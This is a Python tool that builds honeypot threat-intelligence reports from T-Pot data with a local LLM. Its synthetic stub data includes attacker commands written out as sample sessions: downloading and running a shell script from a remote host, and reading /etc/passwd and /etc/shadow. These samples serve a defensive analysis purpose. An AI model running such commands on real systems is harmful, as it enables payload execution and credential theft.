"""
T-Pot LLM Analyser
------------------
Generates plain-English threat intelligence reports from T-Pot honeypot data using
a local LLM (Ollama + llama3.2:3b).

Modes:
    --test-ollama        : smoke test Ollama end-to-end (no ES needed)
    --stub               : run full pipeline against realistic synthetic data
                           (unblocks template iteration before real ES integration)
    --period {daily,weekly,monthly}
    --style {brief,full} : brief = SME executive brief, full = analyst detail
    --theme {dark,light} : chart/report theme; dark for on-screen, light for print

Pipeline (both --stub and real-data modes):
    1. Collect raw honeypot events for the window
    2. Aggregate to summary metrics (top countries, ports, IPs, credentials)
    3. Extract session-level commands and classify with MITRE ATT&CK
    4. Classify session distribution across Cyber Kill Chain stages
    5. Generate NIST CSF-aligned recommendations
    6. Render matplotlib charts (geo, ports, ATT&CK heatmap, kill chain, hourly)
    7. Feed structured data + kill chain narrative to Ollama for prose narrative
    8. Render Markdown report template with narrative + charts + tables
    9. Save to reports/
"""
from __future__ import annotations

import argparse
import os
import random
import sys
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, Any, List

import requests
import yaml
from jinja2 import Environment, FileSystemLoader, select_autoescape

# Local framework modules
from frameworks.mitre_mapper import MitreMapper
from frameworks.kill_chain import KillChainClassifier, KILL_CHAIN_STAGES
from frameworks.nist_csf import NistCsfGenerator
import charts


# ----------------------------------------------------------------------------
# Config
# ----------------------------------------------------------------------------
def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)


# ----------------------------------------------------------------------------
# Ollama client
# ----------------------------------------------------------------------------
def  call_ollama(prompt: str, model: str, base_url: str, timeout: int = 300) -> str:
    """Send prompt to Ollama /api/generate and return the text response."""
    url = f"{base_url}/api/generate"
    payload = {
        "model": model,
        "prompt": prompt,
        "stream": False,
        "options": {"temperature": 0},   # ← add this for reproducible output during iteration
    }
    response = requests.post(url, json=payload, timeout=timeout)
    response.raise_for_status()
    return response.json()["response"]


# ----------------------------------------------------------------------------
# Elasticsearch (stub for now — real queries are a next-session task)
# ----------------------------------------------------------------------------
def query_elasticsearch(config: dict, hours: int) -> Dict[str, Any]:
    """Query T-Pot Elasticsearch for the specified window.

    Currently returns an empty structure. Real implementation will connect via
    SSH tunnel or Nginx-proxied Kibana ES endpoint.
    """
    # TODO: implement real queries in a later session
    return {"total_attacks": 0, "unique_source_ips": 0, "top_source_countries": [],
            "top_attacked_ports": [], "top_credentials_attempted": [],
            "top_source_ips": [], "notable_sessions": [], "malware_hashes": [],
            "hourly_trend": [], "session_details": []}


# ----------------------------------------------------------------------------
# Realistic synthetic data for --stub mode
# ----------------------------------------------------------------------------
def generate_stub_data(hours: int = 24) -> Dict[str, Any]:
    """Produce realistic-looking synthetic T-Pot output for template iteration."""
    random.seed(42)  # reproducible for template development

    return {
        "total_attacks": 1847,
        "unique_source_ips": 342,
        "malware_captured": 2,
        "top_source_countries": [
            {"country": "China", "count": 612, "percentage": 33.1},
            {"country": "United States", "count": 287, "percentage": 15.5},
            {"country": "Russia", "count": 189, "percentage": 10.2},
            {"country": "Netherlands", "count": 143, "percentage": 7.7},
            {"country": "Brazil", "count": 121, "percentage": 6.5},
            {"country": "Germany", "count": 98, "percentage": 5.3},
            {"country": "India", "count": 87, "percentage": 4.7},
            {"country": "France", "count": 71, "percentage": 3.8},
            {"country": "United Kingdom", "count": 63, "percentage": 3.4},
            {"country": "Vietnam", "count": 54, "percentage": 2.9},
        ],
        "top_attacked_ports": [
            {"port": 22, "service": "SSH", "count": 862, "percentage": 46.7},
            {"port": 445, "service": "SMB", "count": 234, "percentage": 12.7},
            {"port": 3306, "service": "MySQL", "count": 189, "percentage": 10.2},
            {"port": 80, "service": "HTTP", "count": 156, "percentage": 8.4},
            {"port": 23, "service": "Telnet", "count": 134, "percentage": 7.3},
            {"port": 21, "service": "FTP", "count": 89, "percentage": 4.8},
            {"port": 8080, "service": "HTTP-alt", "count": 67, "percentage": 3.6},
            {"port": 3389, "service": "RDP", "count": 54, "percentage": 2.9},
            {"port": 1433, "service": "MSSQL", "count": 34, "percentage": 1.8},
            {"port": 5900, "service": "VNC", "count": 28, "percentage": 1.5},
        ],
        "top_credentials_attempted": [
            {"username": "root", "password": "123456", "count": 89},
            {"username": "admin", "password": "admin", "count": 67},
            {"username": "root", "password": "root", "count": 54},
            {"username": "root", "password": "password", "count": 45},
            {"username": "user", "password": "user", "count": 34},
            {"username": "ubuntu", "password": "ubuntu", "count": 28},
        ],
        "top_source_ips": [
            {"ip": "45.61.185.100", "count": 87, "country": "China"},
            {"ip": "185.220.101.15", "count": 71, "country": "Netherlands"},
            {"ip": "178.62.109.45", "count": 54, "country": "United States"},
            {"ip": "94.102.51.28", "count": 43, "country": "Russia"},
            {"ip": "203.0.113.42", "count": 38, "country": "China"},
        ],
        "malware_hashes": [
            {"sha256": "8a7f5e2c1b0d4e6f8a9c3d5e7f9a1b3c5d7e9f1a3b5c7d9e1f3a5b7c9d1e3f5a",
             "filename": "x86.linux.mirai", "sensor": "Dionaea"},
            {"sha256": "3e5a7c9d1f3b5d7e9a1c3e5f7a9c1e3d5f7a9c1e3d5f7b9c1e3d5f7a9c1e3d5f",
             "filename": "arm.iot.loader", "sensor": "Dionaea"},
        ],
        "hourly_trend": [45, 38, 52, 41, 67, 89, 112, 134, 156, 145, 132, 128,
                         119, 108, 94, 87, 76, 62, 54, 48, 43, 38, 34, 45],
        "notable_sessions": [
            "Session S-1247 from 45.61.185.100 (China) attempted 52 SSH login combinations in 8 seconds, then successfully authenticated as root:123456. Attacker executed `uname -a; cat /proc/cpuinfo; wget http://45.61.185.100/x86.sh; chmod +x x86.sh; ./x86.sh` — clear Mirai-family botnet enrollment attempt. Cowrie terminated after ~12s.",
            "Session S-1583 from 178.62.109.45 (US) sent 47 SMB negotiation packets against Dionaea port 445 within a 3-second window — pattern consistent with EternalBlue vulnerability scanning. No successful exploitation observed.",
            "Session S-1892 from 185.220.101.15 (Netherlands / Tor exit node) attempted 189 MySQL login combinations against port 3306, exclusively targeting root and admin usernames. Fully automated brute force; no post-auth activity.",
            "Session S-2104 from 94.102.51.28 (Russia) authenticated to Cowrie as ubuntu:ubuntu and executed `whoami; id; sudo -l; cat /etc/passwd; cat /etc/shadow; history` — reconnaissance for privilege escalation opportunity.",
            "Session S-2417 from 203.0.113.42 (China) attempted URL path enumeration on port 80 against Snare, requesting 34 known WordPress admin paths (`/wp-admin`, `/wp-login.php`, `/xmlrpc.php`) — commodity CMS scanner.",
        ],
        # Session dicts for kill chain classification
        "session_details": [
            {"auth_success": True, "commands_executed": 5, "file_downloads": 1,
             "persistence_actions": 0, "c2_indicators": 0} for _ in range(3)
        ] + [
            {"auth_success": True, "commands_executed": 4, "file_downloads": 0,
             "persistence_actions": 0, "c2_indicators": 0} for _ in range(6)
        ] + [
            {"auth_success": False, "failed_auth_attempts": 50, "commands_executed": 0,
             "file_downloads": 0} for _ in range(1838)
        ],
        # Commands executed across all sessions (for MITRE mapping)
        "all_commands": [
            "uname -a", "cat /proc/cpuinfo", "wget http://mal.example/x.sh",
            "chmod +x x.sh", "whoami", "id", "sudo -l",
            "cat /etc/passwd", "cat /etc/shadow", "history",
            "ps aux", "netstat -antp", "ifconfig", "ip addr",
            "crontab -l", "cat ~/.bash_history",
        ],
    }


# ----------------------------------------------------------------------------
# Pipeline
# ----------------------------------------------------------------------------
def run_pipeline(
    config: dict,
    data: Dict[str, Any],
    style: str,
    hours: int,
    output_dir: str,
    theme: str = "dark",
) -> str:
    """End-to-end: classify → chart → LLM narrative → template render → save."""

    # -------- MITRE ATT&CK classification --------
    mapper = MitreMapper()
    observations = mapper.map_commands(data["all_commands"])
    mitre_tactic_freq = mapper.tactic_frequency(observations)
    mitre_technique_freq = mapper.technique_frequency(observations)
    heatmap_data = mapper.heatmap_matrix(observations)

    # -------- Kill Chain classification --------
    classifier = KillChainClassifier()
    kc_distribution = classifier.classify_batch(data["session_details"])
    kc_narrative = classifier.stage_narrative(kc_distribution)

    # -------- NIST CSF recommendations --------
    csf_generator = NistCsfGenerator()
    if style == "brief":
        recommendations = csf_generator.generate(
            tactic_frequency=mitre_tactic_freq,
            kill_chain_distribution=kc_distribution,
            top_ports=[p["port"] for p in data["top_attacked_ports"]],
            malware_hashes_captured=data.get("malware_captured", 0),
            unique_source_ips=data["unique_source_ips"],
            max_recommendations=5,
        )
    else:  # full
        recommendations = csf_generator.generate(
            tactic_frequency=mitre_tactic_freq,
            kill_chain_distribution=kc_distribution,
            top_ports=[p["port"] for p in data["top_attacked_ports"]],
            malware_hashes_captured=data.get("malware_captured", 0),
            unique_source_ips=data["unique_source_ips"],
            per_function_min=2,
        )

    # -------- Charts --------
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    chart_dir = Path(output_dir) / f"charts_{ts}_{theme}"
    chart_dir.mkdir(parents=True, exist_ok=True)

    chart_geo = charts.plot_geo_origins(
        data["top_source_countries"], str(chart_dir / "geo.png"), theme=theme,
    )
    chart_ports = charts.plot_port_targeting(
        data["top_attacked_ports"], str(chart_dir / "ports.png"), theme=theme,
    )
    chart_hourly = charts.plot_hourly_trend(
        data["hourly_trend"], str(chart_dir / "hourly.png"), theme=theme,
    )
    chart_kill_chain = charts.plot_kill_chain_distribution(
        kc_distribution, str(chart_dir / "kill_chain.png"), theme=theme,
    )
    chart_mitre_heatmap = charts.plot_attack_tactics_heatmap(
        heatmap_data, str(chart_dir / "mitre_heatmap.png"), theme=theme,
    )

    # -------- LLM narrative --------
    prompts_env = Environment(
        loader=FileSystemLoader("prompts"),
        autoescape=select_autoescape(disabled_extensions=("j2",)),
    )
    prompt_file = f"daily_{style}.j2"
    prompt_template = prompts_env.get_template(prompt_file)

    prompt_context = {
        "data": data,
        "window_hours": hours,
        "kill_chain_narrative": kc_narrative,
        "kill_chain_distribution": kc_distribution,
        "mitre_tactic_freq": mitre_tactic_freq,
        "notable_hint": data["notable_sessions"][0] if data["notable_sessions"] else "no notable sessions",
    }
    prompt_text = prompt_template.render(**prompt_context)

    print(f"→ Calling Ollama at {config['ollama']['base_url']} with model '{config['ollama']['model']}'...")
    print(f"  Prompt length: {len(prompt_text)} chars")

    narrative_text = call_ollama(
        prompt=prompt_text,
        model=config["ollama"]["model"],
        base_url=config["ollama"]["base_url"],
        timeout=config["ollama"].get("timeout", 300),
    )
    print(f"  Received {len(narrative_text)} chars of narrative from LLM")

    # -------- Split narrative into sections --------
    # Both prompts instruct the LLM to write N sections separated by blank lines,
    # no headings. We split on double newlines and take the first N.
    n_sections = 3 if style == "brief" else 5
    raw_sections = [s.strip() for s in narrative_text.split("\n\n") if s.strip()]
    sections = raw_sections[:n_sections]
    while len(sections) < n_sections:
        sections.append("*(LLM did not produce this section — regenerate or edit template.)*")

    # -------- Render report template --------
    env = Environment(
        loader=FileSystemLoader("templates"),
        autoescape=select_autoescape(disabled_extensions=("j2",)),
    )
    env.filters["number_format"] = lambda n: f"{n:,}"
    template_file = f"report_{style}.md.j2"
    template = env.get_template(template_file)

    now = datetime.now()
    window_end = now
    window_start = now - timedelta(hours=hours)

    render_context = {
        "report_date": now.strftime("%Y-%m-%d"),
        "generated_at": now.isoformat(timespec="seconds"),
        "window_hours": hours,
        "window_start": window_start.strftime("%Y-%m-%d %H:%M"),
        "window_end": window_end.strftime("%Y-%m-%d %H:%M"),
        "theme": theme,
        "data": data,
        "mitre_tactic_freq": mitre_tactic_freq,
        "mitre_technique_freq": mitre_technique_freq,
        "kill_chain_distribution": kc_distribution,
        "recommendations": recommendations,
        "chart_geo": os.path.relpath(chart_geo, output_dir),
        "chart_ports": os.path.relpath(chart_ports, output_dir),
        "chart_hourly": os.path.relpath(chart_hourly, output_dir),
        "chart_kill_chain": os.path.relpath(chart_kill_chain, output_dir),
        "chart_mitre_heatmap": os.path.relpath(chart_mitre_heatmap, output_dir),
        "baseline_available": False,
    }
    for i, sec in enumerate(sections, 1):
        render_context[f"llm_narrative_section_{i}"] = sec

    report_body = template.render(**render_context)

    # -------- Write report to disk --------
    output_path = Path(output_dir)
    output_path.mkdir(parents=True, exist_ok=True)
    filename = f"report_{style}_{theme}_{ts}.md"
    filepath = output_path / filename
    filepath.write_text(report_body)

    return str(filepath)


# ----------------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------------
def main() -> int:
    parser = argparse.ArgumentParser(description="T-Pot LLM Threat Analyser")
    parser.add_argument("--config", default="config.yml", help="Path to config file")
    parser.add_argument("--period", choices=["daily", "weekly", "monthly"], default="daily")
    parser.add_argument("--style", choices=["brief", "full"], default="brief",
                        help="brief = SME executive brief; full = analyst detail")
    parser.add_argument("--stub", action="store_true",
                        help="Use realistic synthetic data instead of real Elasticsearch")
    parser.add_argument("--theme", choices=["dark", "light"], default="dark",
                        help="Chart/report theme — dark for on-screen, light for print")
    parser.add_argument("--test-ollama", action="store_true",
                        help="Smoke test Ollama end-to-end (no ES / no report generated)")
    args = parser.parse_args()

    # --test-ollama shortcut
    if args.test_ollama and not os.path.exists(args.config):
        config = {"ollama": {"base_url": "http://localhost:11434", "model": "llama3.2:3b", "timeout": 120}}
    else:
        config = load_config(args.config)

    if args.test_ollama:
        prompt = "In one sentence, explain what a low-interaction honeypot is in cybersecurity."
        print(f"→ Testing Ollama at {config['ollama']['base_url']}...")
        response = call_ollama(prompt=prompt, model=config["ollama"]["model"],
                               base_url=config["ollama"]["base_url"],
                               timeout=config["ollama"].get("timeout", 120))
        print(f"\nOllama response:\n{response}\n")
        return 0

    # Determine window hours
    hours_map = {"daily": 24, "weekly": 168, "monthly": 720}
    hours = hours_map[args.period]

    # Get data — stub or real ES
    if args.stub:
        print(f"→ Using STUB synthetic data ({args.period}, {hours}h window)")
        data = generate_stub_data(hours)
    else:
        print(f"→ Querying Elasticsearch for last {hours}h...")
        data = query_elasticsearch(config, hours)
        if data["total_attacks"] == 0:
            print("⚠ Zero events returned from Elasticsearch. Run with --stub for template iteration.")
            return 1

    # Run pipeline
    output_dir = config.get("report", {}).get("output_dir", "reports")
    filepath = run_pipeline(config, data, args.style, hours, output_dir, args.theme)

    print(f"\n✓ Report written to: {filepath}")
    print(f"  Preview: cat '{filepath}' | head -60")
    print(f"  Convert to PDF: pandoc '{filepath}' -o '{filepath.replace('.md', '.pdf')}'")
    print(f"  Convert to DOCX: pandoc '{filepath}' -o '{filepath.replace('.md', '.docx')}'")
    return 0


if __name__ == "__main__":
    sys.exit(main())